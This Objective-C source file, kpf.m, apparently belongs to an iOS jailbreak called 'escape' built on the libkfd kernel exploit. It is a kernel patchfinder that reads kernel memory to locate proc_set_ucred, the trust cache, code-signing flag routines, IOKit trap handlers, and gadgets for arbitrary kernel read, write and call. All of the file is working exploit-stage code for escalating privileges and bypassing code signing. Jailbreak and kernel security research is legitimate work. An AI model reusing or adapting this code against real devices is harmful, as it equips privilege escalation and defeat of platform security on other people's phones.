//
//  kpf.m
//  escape
//
//  Created by Xiao on 2023/11/16.
//

#import <Foundation/Foundation.h>
#import "kpf.h"
#import "objcLogger.h"
#import <stdint.h>
#import "libkfd.h"

static uint64_t textexec_text_addr = 0;
static uint64_t prelink_text_addr = 0;
static uint64_t textexec_text_size = 0;
static uint64_t prelink_text_size = 0;
static BOOL kernel_inited = NO;

extern get_kernel_section(struct kfd *kfd, uint64_t kernel_base, const char *segname, const char *sectname, uint64_t *addr, uint64_t *size);

void init_kernel(struct kfd* kfd) {
    if (kernel_inited == YES) return; 
    uint64_t kernel_base = kfd->info.kernel.kernel_slide + 0xFFFFFFF007004000;
    get_kernel_section(kfd, kernel_base, "__TEXT_EXEC", "__text", &textexec_text_addr, &textexec_text_size);
    assert(textexec_text_addr != 0 && textexec_text_size != 0);
    get_kernel_section(kfd, kernel_base, "__PLK_TEXT_EXEC", "__text", &prelink_text_addr, &prelink_text_size);
    assert(prelink_text_addr != 0);
    LOG_FMT(@"[+] found textexec_text_addr: 0x%llx", textexec_text_addr);
    LOG_FMT(@"[+] found prelink_text_addr: 0x%llx", prelink_text_addr);
    kernel_inited = YES;
}

static unsigned char *
boyermoore_horspool_memmem(const unsigned char* haystack, size_t hlen,
                           const unsigned char* needle,   size_t nlen)
{
    size_t last, scan = 0;
    size_t bad_char_skip[UCHAR_MAX + 1]; /* Officially called:
                                          * bad character shift */

    /* Sanity checks on the parameters */
    if (nlen <= 0 || !haystack || !needle)
        return NULL;

    /* ---- Preprocess ---- */
    /* Initialize the table to default value */
    /* When a character is encountered that does not occur
     * in the needle, we can safely skip ahead for the whole
     * length of the needle.
     */
    for (scan = 0; scan <= UCHAR_MAX; scan = scan + 1)
        bad_char_skip[scan] = nlen;

    /* C arrays have the first byte at [0], therefore:
     * [nlen - 1] is the last byte of the array. */
    last = nlen - 1;

    /* Then populate it with the analysis of the needle */
    for (scan = 0; scan < last; scan = scan + 1)
        bad_char_skip[needle[scan]] = last - scan;

    /* ---- Do the matching ---- */

    /* Search the haystack, while the needle can still be within it. */
    while (hlen >= nlen)
    {
        /* scan from the end of the needle */
        for (scan = last; haystack[scan] == needle[scan]; scan = scan - 1)
            if (scan == 0) /* If the first byte matches, we've found it. */
                return (void *)haystack;

        /* otherwise, we need to skip some bytes and start again.
           Note that here we are getting the skip value based on the last byte
           of needle, no matter where we didn't match. So if needle is: "abcd"
           then we are skipping based on 'd' and that value will be 4, and
           for "abcdd" we again skip on 'd' but the value will be only 1.
           The alternative of pretending that the mismatched character was
           the last character is slower in the normal case (E.g. finding
           "abcd" in "...azcd..." gives 4 by using 'd' but only
           4-2==2 using 'z'. */
        hlen     -= bad_char_skip[haystack[last]];
        haystack += bad_char_skip[haystack[last]];
    }

    return NULL;
}

uint64_t bof64(uint64_t kfd, uint64_t ptr) {
    for (; ptr >= 0; ptr -= 4) {
        uint64_t op;
        kread(kfd, (uint64_t)ptr, &op, 8);
        op &= 0xFFFFFFFF;
        if ((op & 0xffc003ff) == 0xD10003FF) {
            // 0xD10003FF: sub sp, sp, 0
            return ptr;
        } else if ((op & 0xffc003ff) == 0x910003FD) {
            unsigned delta = (op >> 10) & 0xfff;
            if ((delta & 0xf) == 0) {
                uint64_t prev = ptr - ((delta >> 4) + 1) * 4;
                uint32_t au;
                kread(kfd, (uint64_t)prev, &au, 4);
                if ((au & 0xffc003e0) == 0xa98003e0) {
                    return prev;
                }
                while (ptr > 0) {
                    ptr -= 4;
                    kread(kfd, (uint64_t)ptr, &au, 4);
                    if ((au & 0xffc003ff) == 0xD10003ff && ((au >> 10) & 0xfff) == delta + 0x10) {
                        return ptr;
                    }
                    if ((au & 0xffc003e0) != 0xa90003e0) {
                        ptr += 4;
                        break;
                    }
                }
            }
        }
    }
    return 0;
}

//https://github.com/xerub/patchfinder64/blob/master/patchfinder64.c#L1213-L1229
u64 find_add_x0_x0_0x40_ret(struct kfd* kfd) {
    static const uint8_t insn[] = { 0x00, 0x00, 0x01, 0x91, 0xc0, 0x03, 0x5f, 0xd6 }; // 0x91010000, 0xD65F03C0
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, insn, sizeof(insn));
        if (str) {
            return str - buffer + textexec_text_addr + current_offset;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    current_offset = 0;
    while (current_offset < prelink_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, prelink_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, insn, sizeof(insn));
        if (str) {
            return str - buffer + prelink_text_addr + current_offset;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    return 0;
}

u64 find_proc_set_ucred_function(struct kfd* kfd) {
    // We find the place that sets up the call to zalloc_ro_mut.
    /*
    a0008052   mov     w0, #0x5
    e10302aa   mov     x1, x2
    02048052   mov     w2, #0x20 <-- 0x20 is the offset of ucred on iOS 15.
    04018052   mov     w4, #0x8
    bl zalloc_ro_mut
    */
    uint8_t match_15[16] = { 0xa0, 0x00, 0x80, 0x52, 0xe1, 0x03, 0x02, 0xaa, 0x02, 0x04, 0x80, 0x52, 0x04, 0x01, 0x80, 0x52 };
    uint8_t match_16[12] = { 0xa0, 0x00, 0x80, 0x52, 0x02, 0x04, 0x80, 0x52, 0x04, 0x01, 0x80, 0x52 };
    uint64_t matching_size = 0;
    uint8_t *target = nil;

    if (@available(iOS 16, *)) {
        target = match_16;
        matching_size = 12;
    } else {
        target = match_15;
        matching_size = 16;
    }
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, target, matching_size);
        if (str) {
            LOG_FMT_CONSOLE(@"[KPF_DEBUG] 0x%llx", str - buffer + textexec_text_addr + current_offset - kfd->info.kernel.kernel_slide);
            uint64_t bof = bof64((u64)kfd, str - buffer + textexec_text_addr + current_offset);
            return bof;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    return 0;
}

uint64_t find_trustcaches_addr(struct kfd *kfd) {
    // find "image4 interface not available"
    const char *str_target = "image4 interface not available";
    int current_offset = 0;
    uint64_t str_addr = 0;
    uint64_t searching_addr = 0x30000 + kfd->info.kernel.kernel_slide + 0xFFFFFFF007004000;
    while (current_offset < 0x1000000) {
        uint8_t *buffer = malloc(0x1000);
        kread((u64)kfd, searching_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, str_target, strlen(str_target));
        if (str) {
            LOG_FMT_CONSOLE(@"[KPF_DEBUG] 0x%llx", str - buffer + searching_addr + current_offset - kfd->info.kernel.kernel_slide);
            str_addr = str - buffer + searching_addr + current_offset;
            break;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    if (str_addr == 0) {
        return 0;
    }

#define ASM_ADRP(off, reg) ((0x90000000 | ((uint32_t)(((off >> 12) & 0x3) << 29)) | ((uint32_t)(((off >> 12) & (~0x3)) << 3)) | reg) & 0xF0FFFFFF)
#define ASM_ADD(imm, regdst, regsrc) (0x91000000 | (imm << 10) | (regsrc << 5) | (regdst))
#define DISASM_ADRP(__code, __off, __reg) \
    do {\
        uint64_t __offset = (int)((((__code & 0x60000000) >> 29) | ((__code & 0xFFFFE0) >> 3)) << 12); \
        *__off = __offset; \
        *__reg = (__code & 0x1f); \
    } while(0)
#define DISASM_ADD(__code, __imm, __reg1, __reg2) \
    do { \
        *__imm = ((__code & 0x003FFC00)) >> 7; \
        *__reg1 = (__code & 0x1F); \
        *__reg2 = ((__code & 0x3E0) >> 5); \
    } while(0)
    current_offset = 0;
    uint64_t trust_cache_runtime_init = 0;
    while (current_offset < textexec_text_size) {
        uint8_t *buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        for (int i = 0; i < 0x1000; i += 4) {
            uint64_t current_addr = textexec_text_addr + current_offset + i;
            uint64_t page = current_addr & (~(uint64_t)0xFFF);
            uint64_t page_offset = (str_addr & (~(uint64_t)0xFFF)) - page;
            uint32_t code = ASM_ADRP(page_offset, 0);
            if (*(uint32_t *)(buffer + i) == code) {
                uint64_t code2 = ASM_ADD((str_addr & 0xFFF), 0, 0);
                if (*(uint32_t *)(buffer + i + 4) == code2) {
                    trust_cache_runtime_init = i + textexec_text_addr + current_offset;
                    break;
                }
            }
        }
        free(buffer);
        if (trust_cache_runtime_init) break;
        current_offset += 0x1000;
    }
    if (!trust_cache_runtime_init) {
        LOG(@"[-] failed to find trustcache_runtime_init");
        return 0;
    }
    uint64_t code = 0;
    kread((u64)kfd, trust_cache_runtime_init-0x64, &code, 8);
    uint32_t adrp_code = code & 0xFFFFFFFF;
    uint32_t ldr_code = (code >> 32) & 0xFFFFFFFF;
    uint64_t page_addr = 0, page_offset = 0, reg = 0;
    DISASM_ADRP(adrp_code, &page_addr, &reg);
    LOG_FMT_CONSOLE(@"[KPF_DEBUG] page=0x%llx reg=0x%llx", page_addr, reg);
    DISASM_ADD(ldr_code, &page_offset, &reg, &reg);
    LOG_FMT_CONSOLE(@"[KPF_DEBUG] pageoff=0x%llx reg=0x%llx reg=0x%llx", page_offset, reg, reg);
    uint64_t addr = (((trust_cache_runtime_init-0x64) & 0xfffffffffffff000) + page_offset + page_addr);
    uint64_t data = 0;
    kread((u64)kfd, addr, &data, 8);
    LOG_FMT_CONSOLE(@"[KPF_DEBUG] data=0x%llx", data);
    
    return data + 0x20;
}

uint64_t find_proc_updatecsflags(struct kfd *kfd) {
    // iOS 16 only
    // tested on iPhone X, iOS 16.5
    uint64_t matching_size = 12;
    uint8_t target[12] = { 0xA0, 0x00, 0x80, 0x52, 0x82, 0x03, 0x80, 0x52, 0x84, 0x00, 0x80, 0x52 };
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t *buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, target, matching_size);
        if (str) {
            LOG_FMT_CONSOLE(@"[KPF_DEBUG] 0x%llx", str - buffer + textexec_text_addr + current_offset - kfd->info.kernel.kernel_slide);
            uint64_t bof = bof64((u64)kfd, str - buffer + textexec_text_addr + current_offset);
            return bof;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    return 0;
}

uint64_t find_container_initwithcapacity(struct kfd *kfd) {
    // todo: find OSArray::initWithCapacity
    uint64_t matching_size = 8;
    uint8_t target[8] = { 0x28, 0xFC, 0x43, 0xD3, 0xE9, 0x7F, 0x7D, 0xB2 };
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t *buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, target, matching_size);
        if (str) {
            uint64_t code = 0;
            kread((u64)kfd, str - buffer + textexec_text_addr + current_offset - 0x8, &code, 8);
            if ((code & 0xFFFFFFFF) == 0xF9001260) {
                LOG_FMT_CONSOLE(@"[KPF_DEBUG] 0x%llx", str - buffer + textexec_text_addr + current_offset - kfd->info.kernel.kernel_slide);
                return str - buffer + textexec_text_addr + current_offset - 0x4C;
            }
        }
        current_offset += 0x1000;
        free(buffer);
    }
    return 0;
}

uint64_t find_getiotrap(struct kfd *kfd) {
    uint64_t matching_size = 0x18;
    uint8_t target[0x18] =  { 
        0xF4, 0x4F, 0xBE, 0xA9, 0xFD, 0x7B, 0x01, 0xA9, 
        0xFD, 0x43, 0x00, 0x91, 0xF3, 0x03, 0x01, 0xAA, 
        0x08, 0x00, 0x40, 0xF9, 0x08, 0xE1, 0x42, 0xF9 
    };
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t *buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, target, matching_size);
        if (str) {
            return str - buffer + textexec_text_addr + current_offset;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    return 0;
}

uint64_t kfind(struct kfd *kfd, uint8_t *pattern, uint64_t size) {
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t *buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, pattern, size);
        if (str) {
            return str - buffer + textexec_text_addr + current_offset;
        }
        current_offset += 0x1000;
        free(buffer);
    }
    return 0;
}

void find_krw_kcall_gadget(struct kfd *kfd, uint64_t *kcall, uint64_t *kread, uint64_t *kwrite) {
    // kread:  ldr x0, [x0] ; ret
    // kwrite: str x1, [x0] ; ret
    // kcall:  mov x0, x3 ; br x4
find_kcall: {
        uint8_t pattern[] = {
            0xE0, 0x03, 0x03, 0xAA,
            0x80, 0x00, 0x1F, 0xD6
        };
        uint64_t size = 8;
        uint64_t addr = kfind(kfd, pattern, size);        
        *kcall = addr;
    }
find_kread: {
        uint8_t pattern[] = {
            0x00, 0x00, 0x40, 0xF9,
            0xC0, 0x03, 0x5F, 0xD6
        };
        uint64_t size = 8;
        uint64_t addr = kfind(kfd, pattern, size);        
        *kread = addr;
    }
find_kwrite: {
        uint8_t pattern[] = {
            0x01, 0x00, 0x00, 0xF9,
            0xC0, 0x03, 0x5F, 0xD6
        };
        uint64_t size = 8;
        uint64_t addr = kfind(kfd, pattern, size);        
        *kwrite = addr;
    }
}

BOOL find_offset(struct kfd *kfd) {
    static bool found = false;
    if (found) return YES;
    found = true;
    init_kernel(kfd);
    kcall_gadget = 0, kread_gadget = 0, kwrite_gadget = 0;    
    off_proc_set_ucred = find_proc_set_ucred_function(kfd);
    off_add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret(kfd);
    off_trustcache = find_trustcaches_addr(kfd);
    if (off_zm_fix_alloc == 0)
        off_zm_fix_alloc = 0xFFFFFFF00778B5D0 + kfd->info.kernel.kernel_slide;
    off_proc_updatecsflags = find_proc_updatecsflags(kfd);
    off_container_init = find_container_initwithcapacity(kfd);
    off_getiotrap = find_getiotrap(kfd);
    find_krw_kcall_gadget(kfd, &kcall_gadget, &kread_gadget, &kwrite_gadget);
    LOG_FMT(@"[+] found proc_set_ucred: 0x%llx", off_proc_set_ucred);
    LOG_FMT(@"[+] found add_x0_x0_0x40_ret: 0x%llx", off_add_x0_x0_0x40_ret);
    LOG_FMT(@"[+] found off_trustcache: 0x%llx", off_trustcache);
    LOG_FMT(@"[+] found proc_updatecsflags: 0x%llx", off_proc_updatecsflags);
    LOG_FMT(@"[+] found container init: 0x%llx", off_container_init);
    LOG_FMT(@"[+] found getiotrap: 0x%llx", off_getiotrap);
    LOG_FMT(@"[+] found kcall gadget: 0x%llx", kcall_gadget);
    LOG_FMT(@"[+] found kread gadget: 0x%llx", kread_gadget);
    LOG_FMT(@"[+] found kwrite gadget: 0x%llx", kwrite_gadget);

    BOOL missing_offset = (!off_proc_set_ucred || !off_add_x0_x0_0x40_ret || !off_trustcache || !off_proc_updatecsflags ||
                           !off_container_init || !off_getiotrap || !kcall_gadget || !kread_gadget || !kwrite_gadget);

    if (missing_offset) {
        LOG(@"[-] FATAL ERROR: failed to find offsets");
        return NO;
    }
    return YES;
}
